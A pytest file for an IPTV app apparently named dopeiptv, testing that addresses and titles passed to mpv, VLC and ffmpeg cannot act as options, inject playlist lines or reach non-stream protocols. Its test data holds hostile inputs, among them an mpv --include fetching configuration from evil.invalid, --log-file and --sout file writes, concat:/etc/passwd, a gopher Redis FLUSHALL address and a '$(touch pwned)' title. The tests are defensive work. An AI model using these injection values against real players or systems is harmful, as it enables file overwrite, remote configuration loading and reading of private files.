"""An address is never an option of the player it is handed to.

A playlist's line is whatever its author wrote. One that starts with a dash
went to an external mpv or VLC as an option of theirs: "--log-file=..."
overwrote any file of the person's with mpv's log (the title, also the
playlist's, written into it), "--include=http://..." took mpv's whole
configuration from another server. The address goes after "--" now.
"""

from __future__ import annotations

import shutil
import subprocess

import pytest

from dopeiptv.media import players

EVIL = ("--log-file=/tmp/x", "--include=http://evil.invalid/mpv.conf", "-v",
        "--script=/tmp/x.lua", "--sout=#std{access=file,dst=/tmp/x}")


@pytest.mark.parametrize("player", ["mpv", "vlc"])
@pytest.mark.parametrize("url", [*EVIL, "http://h.invalid/live/1.ts", "/films/a.mkv"])
def test_the_address_comes_last_after_the_end_of_the_options(player, url):
    cmd = players.player_command(player, "/usr/bin/" + player, url, "A title")
    assert cmd[0] == "/usr/bin/" + player
    assert cmd[-2:] == ["--", url]
    # Nothing of the address before the "--".
    assert url not in cmd[:-2] and cmd.count("--") == 1


@pytest.mark.parametrize("player", ["mpv", "vlc"])
def test_a_title_that_looks_like_an_option_stays_a_title(player):
    cmd = players.player_command(player, "/usr/bin/" + player, "http://h.invalid/1.ts",
                                 "--log-file=/tmp/x")
    head = cmd[1:cmd.index("--")]
    if player == "mpv":
        assert head[0] == "--force-media-title=--log-file=/tmp/x"
    else:
        # VLC takes the word after --meta-title as its value, whatever it is.
        assert head[:2] == ["--meta-title", "--log-file=/tmp/x"]


def test_launch_player_starts_that_command(monkeypatch):
    seen = []
    monkeypatch.setattr(players, "find_player_executable", lambda _p: "/usr/bin/mpv")
    monkeypatch.setattr(players.subprocess, "Popen", lambda cmd, **_k: seen.append(cmd))
    for url in ("http://h.invalid/live/u/p/1.ts", "rtsp://box.invalid/?src=1",
                "udp://@239.0.0.1:1234", "/films/a film.mkv", "C:\\Films\\a.mkv",
                "ytdl://https://www.youtube.com/watch?v=x"):
        seen.clear()
        players.launch_player("mpv", url, "T")
        if url.startswith(("http", "rtsp")):
            # An http(s) address, and every other network address but a
            # multicast group's, in a playlist file of the user's own, never
            # in the command line others can read - the title neither.
            assert len(seen) == 1 and url not in seen[0]
            assert not any("T" == a or a.endswith("=T") for a in seen[0])
            handoff = seen[0][-1].split("=", 1)[1]
            assert seen[0][-1] == "--playlist=" + handoff
            with open(handoff, encoding="utf-8") as fh:
                assert url in fh.read().splitlines()
            import os
            import stat
            assert stat.S_IMODE(os.stat(handoff).st_mode) == 0o600
            os.remove(handoff)
        else:
            assert seen == [players.player_command("mpv", "/usr/bin/mpv", url, "T")], url


@pytest.mark.parametrize("player", ["mpv", "vlc"])
def test_no_handoff_file_no_player_never_the_address_instead(player, monkeypatch):
    """The handoff file could not be made (no runtime folder, a full disk):
    the player is not started and the person is told - the address never
    goes in its command line instead."""
    started, told = [], []
    monkeypatch.setattr(players, "find_player_executable", lambda _p: "/usr/bin/" + player)
    monkeypatch.setattr(players.subprocess, "Popen", lambda cmd, **_k: started.append(cmd))
    monkeypatch.setattr(players, "private_file", lambda *_a, **_k: "")
    monkeypatch.setattr(players.QMessageBox, "warning",
                        staticmethod(lambda *a, **_k: told.append(a[-1])))
    for url in ("http://h.invalid/live/u/p/1.ts", "rtsp://cam:pw@cam.invalid/live"):
        players.launch_player(player, url, "T")
    assert started == [] and len(told) == 2
    name = "mpv" if player == "mpv" else "VLC"
    assert told[0] == players.tr("status_player_no_handoff", name=name)
    # What holds no login is handed over as it always was.
    players.launch_player(player, "udp://@239.0.0.1:1234", "T")
    assert len(started) == 1 and started[0][-1] == "udp://@239.0.0.1:1234"


def test_a_network_address_with_a_login_goes_in_a_handoff_file(monkeypatch):
    seen = []
    monkeypatch.setattr(players, "find_player_executable", lambda _p: "/usr/bin/mpv")
    monkeypatch.setattr(players.subprocess, "Popen", lambda cmd, **_k: seen.append(cmd))
    # A login no random file name can hold by chance ("pw" once failed a
    # run: the handoff file's own random name had those two letters).
    for url in ("rtsp://cam:s3cr3tword@cam.invalid/live",
                "srt://h.invalid:9000?passphrase=s3cr3tword",
                "rtmp://h.invalid/app/x?token=s3cr3tword"):
        seen.clear()
        players.launch_player("mpv", url, "T")
        assert not any("s3cr3tword" in a for a in seen[0])
        assert seen[0][-1].startswith("--playlist=")
        import os
        os.remove(seen[0][-1].split("=", 1)[1])
    assert players.handed_over("https://h/x") and players.handed_over("rtsp://192.168.1.5/?src=1")
    assert not players.handed_over("/films/a.mkv") and not players.handed_over("udp://@239.0.0.1:1")
    # A token where carries_login cannot see it: in the path, under a word
    # of its own - handed over all the same.
    for url in ("rtmp://h.invalid/live/9f86d081884c7d659a2feaa0c55ad015", "srt://h.invalid:9?streamid=x",
                "rtsp://h.invalid/stream?x-opaque=y"):
        assert players.handed_over(url), url
    assert players.handed_over("udp://@239.0.0.1:1?pass=pw")


@pytest.mark.parametrize("player", ["mpv", "vlc"])
def test_with_a_handoff_the_title_is_the_playlists_own(player, tmp_path):
    """A title watched privately is nobody else's to read: with a handoff
    file it is the playlist's #EXTINF line, which mpv and VLC both show,
    and stands nowhere in the command line."""
    path = players.handoff_file("http://h.invalid/1.ts", "Secret title", str(tmp_path))
    cmd = players.player_command(player, "/usr/bin/" + player, "http://h.invalid/1.ts",
                                 "Secret title", path)
    assert not any("Secret title" in a for a in cmd)
    assert "--force-media-title" not in " ".join(cmd) and "--meta-title" not in cmd
    with open(path, encoding="utf-8") as fh:
        assert "#EXTINF:-1,Secret title" in fh.read().splitlines()


def test_a_handoff_file_holds_one_line_and_goes(tmp_path, monkeypatch):
    """No line break in an address or a title reaches the playlist file as
    a second entry, and the file is deleted once its player had time."""
    monkeypatch.setattr(players, "HANDOFF_S", 0.05)
    assert players.handoff_file("http://h.invalid/1.ts\nfile:///etc/passwd", "T",
                                str(tmp_path)) == ""
    path = players.handoff_file("http://h.invalid/1.ts", "A\nfile:///etc/passwd",
                                str(tmp_path))
    with open(path, encoding="utf-8") as fh:
        lines = fh.read().splitlines()
    assert lines == ["#EXTM3U", "#EXTINF:-1,Afile:///etc/passwd", "http://h.invalid/1.ts"]
    import time
    time.sleep(0.3)
    assert not (tmp_path / path.rsplit("/", 1)[-1]).exists()
    vlc = players.player_command("vlc", "/usr/bin/vlc", "http://h.invalid/1.ts", "T", path)
    assert vlc[-2:] == ["--", path] and "http://h.invalid/1.ts" not in vlc


NOT_STREAMS = (*EVIL, "concat:/etc/passwd|/etc/hosts", "subfile,,start,0,end,9,,:/etc/passwd",
               "gopher://127.0.0.1:6379/_FLUSHALL", "unix:///run/user/1000/bus", "fd:0",
               "pipe:0", "cache:http://h.invalid/1.ts", "memory://#EXTM3U", "edl://x",
               "av://v4l2:/dev/video0", "ytdl://file:///etc/passwd", "", " ")


@pytest.mark.parametrize("player", ["mpv", "vlc"])
@pytest.mark.parametrize("url", NOT_STREAMS)
def test_what_is_no_streams_address_never_reaches_a_player(player, url, monkeypatch):
    """Not a stream's address and not a file's path: no player is started
    for it at all, and the person is told (the words Open address has)."""
    started, told = [], []
    monkeypatch.setattr(players, "find_player_executable", lambda _p: "/usr/bin/" + player)
    monkeypatch.setattr(players.subprocess, "Popen", lambda cmd, **_k: started.append(cmd))
    monkeypatch.setattr(players.QMessageBox, "warning",
                        staticmethod(lambda *a, **_k: told.append(a[-1])))
    players.launch_player(player, url, "T")
    assert started == [] and len(told) == 1


def test_the_schemes_a_stream_has_and_what_ffmpeg_makes_of_an_address():
    from dopeiptv.core import player_exec as pe

    for url, scheme in (("http://h/1.ts", "http"), ("HTTPS://h/1.m3u8", "https"),
                        ("/films/a:b.mkv", ""), ("C:\\Films\\a.mkv", ""), ("c:/x.ts", ""),
                        ("film.mkv", ""), ("file:///films/a.mkv", "file"),
                        ("concat:/a|/b", "concat"), ("subfile,,start,0,end,9,,:/a", "subfile"),
                        ("crypto+file:///a", "crypto+file"), ("gopher://h:70/_x", "gopher"),
                        ("--log-file=/x", ""), ("", "")):
        assert pe.address_scheme(url) == scheme, url
    for url in ("http://h/1.ts", "https://h/x.m3u8", "rtsp://h/x", "rtmp://h/app/x",
                "rtp://239.0.0.1:5000", "udp://@239.0.0.1:1234", "srt://h:9000",
                "mms://h/x", "mmsh://h/x", "/films/a.mkv", "C:\\a.mkv", "file:///films/a.mkv"):
        assert pe.fetchable(url), url
    # A stream's address keeps ffmpeg to a stream's protocols; a file's own
    # path keeps ffmpeg's own rule for files.
    opts = pe.ffmpeg_protocols("http://h/x.m3u8")
    assert opts[0] == "-protocol_whitelist"
    listed = opts[1].split(",")
    for needed in ("http", "https", "tcp", "tls", "crypto", "udp", "rtp", "rtmp", "httpproxy"):
        assert needed in listed
    for never in ("file", "concat", "subfile", "pipe", "fd", "unix", "gopher", "cache", "async"):
        assert never not in listed
    assert pe.ffmpeg_protocols("/films/a.mkv") == pe.ffmpeg_protocols("file:///a.mkv") == []


def _recorder(tmp_path, monkeypatch, kind, name):
    from PyQt6.QtCore import QSettings

    from dopeiptv.core import recording
    from dopeiptv.core.recording import RecordingManager

    s = QSettings("dopeIPTV-test", name)
    s.clear()
    s.setValue("recordings_dir", str(tmp_path))
    rm = RecordingManager(s)
    seen: list[list[str]] = []

    class FakeProc:
        def __init__(self, cmd, **_kw):
            seen.append(cmd)

        def poll(self):
            return None

    class FakeFeed:                 # the app's own reading of the stream: none here
        def __init__(self, *_a, **_k):
            pass

        def start(self):
            pass

    monkeypatch.setattr(recording.subprocess, "Popen", FakeProc)
    monkeypatch.setattr(recording, "Feed", FakeFeed)
    monkeypatch.setattr(RecordingManager, "recorder",
                        staticmethod(lambda: (kind, "/usr/bin/" + kind)))
    return rm, seen


def test_the_mpv_recorder_takes_the_address_after_its_options(tmp_path, monkeypatch):
    """The recorder without ffmpeg is mpv: the address last, after "--"."""
    rm, seen = _recorder(tmp_path, monkeypatch, "mpv", "recdash")
    url = "http://h.invalid/live/u/p/1.ts"
    for job in ({}, {"_classic": True}):
        seen.clear()
        rm._spawn({"url": url, "title": "T", "stop": 9e12, **job})
        cmd = seen[0]
        # Its input, or the bridge's alias for the address - never the address.
        last = "-" if not job else cmd[-1]
        assert cmd[-2:] == ["--", last] and url not in cmd
        assert last == "-" or ".stream.invalid/" in last
        assert any(a.startswith("--stream-record=") for a in cmd[:-2])
        assert any(a.startswith("--length=") for a in cmd[:-2])
        assert "--ytdl=no" in cmd                   # no yt-dlp run on it either


@pytest.mark.parametrize("kind", ["ffmpeg", "mpv"])
@pytest.mark.parametrize("url", [u for u in NOT_STREAMS if u.strip()])
def test_what_is_no_streams_address_is_never_recorded(kind, url, tmp_path, monkeypatch):
    from dopeiptv.core.recording import NOT_A_STREAM

    rm, seen = _recorder(tmp_path, monkeypatch, kind, "recnostream")
    job = {"url": url, "title": "T", "stop": None, "status": "scheduled"}
    rm._spawn(job)
    assert seen == []
    assert job["status"] == "failed" and job["error"] == NOT_A_STREAM


def test_ffmpeg_records_a_stream_with_a_streams_protocols_only(tmp_path, monkeypatch):
    from dopeiptv.core.player_exec import FFMPEG_PROTOCOLS

    rm, seen = _recorder(tmp_path, monkeypatch, "ffmpeg", "recproto")
    seen.clear()
    rm._spawn({"url": "http://h.invalid/live/u/p/1.ts", "title": "T", "stop": None})
    cmd = seen[0]                   # read by the app: its input, and nothing else
    assert cmd[cmd.index("-i") + 1] == "pipe:0"
    assert cmd[cmd.index("-protocol_whitelist") + 1] == "pipe"
    from dopeiptv.core.player_exec import BRIDGED_PROTOCOLS
    from dopeiptv.core import recording
    monkeypatch.setattr(recording, "ffmpeg_major", lambda _exe: 6)
    for url, kind in (("http://h.invalid/live/u/p/1.ts", None), ("https://h.invalid/x.m3u8", None),
                      ("rtsp://box.invalid/?src=1", "satip"), ("udp://@239.0.0.1:1234", None),
                      ("rtsp://cam.invalid/live", None)):
        seen.clear()
        rm._spawn({"url": url, "title": "T", "stop": None, "_classic": True, "source_kind": kind})
        cmd = seen[0]
        i = cmd.index("-i")
        web = url.startswith("http")
        listed = url == "rtsp://cam.invalid/live"
        # An http(s) address through the bridge under an alias, what that
        # needs alone; another network address in a private list; a SAT>IP
        # tuning and a multicast group as they are, a stream's protocols.
        if web:
            assert cmd[i + 1] != url and ".stream.invalid/" in cmd[i + 1]
        elif listed:
            assert url not in cmd and cmd[i + 1].endswith(".ffconcat")
        else:
            assert cmd[i + 1] == url
        assert cmd[cmd.index("-protocol_whitelist") + 1] == (
            BRIDGED_PROTOCOLS if web else "file," + FFMPEG_PROTOCOLS if listed else FFMPEG_PROTOCOLS)
        # An input option of that address, before its -i.
        assert cmd.index("-protocol_whitelist") < i
    # A file's own path: ffmpeg's own rule for files, nothing added.
    seen.clear()
    rm._spawn({"url": str(tmp_path / "a.ts"), "title": "T", "stop": None})
    assert "-protocol_whitelist" not in seen[0]


@pytest.mark.skipif(shutil.which("mpv") is None, reason="needs mpv")
def test_the_real_mpv_writes_no_file_an_address_names(tmp_path):
    """mpv itself, as it is installed here: the "address" that was a
    --log-file is now a file it cannot open, and nothing is written."""
    target = tmp_path / "clobbered.txt"
    target.write_text("the person's own file\n", encoding="utf-8")
    cmd = players.player_command("mpv", shutil.which("mpv") or "mpv",
                                 f"--log-file={target}", "T' $(touch pwned) '")
    cmd[1:1] = ["--no-config", "--vo=null", "--ao=null", "--no-terminal"]
    done = subprocess.run(cmd, cwd=tmp_path, stdin=subprocess.DEVNULL,
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                          timeout=60, check=False)
    assert done.returncode != 0                      # nothing by that name to play
    assert target.read_text(encoding="utf-8") == "the person's own file\n"
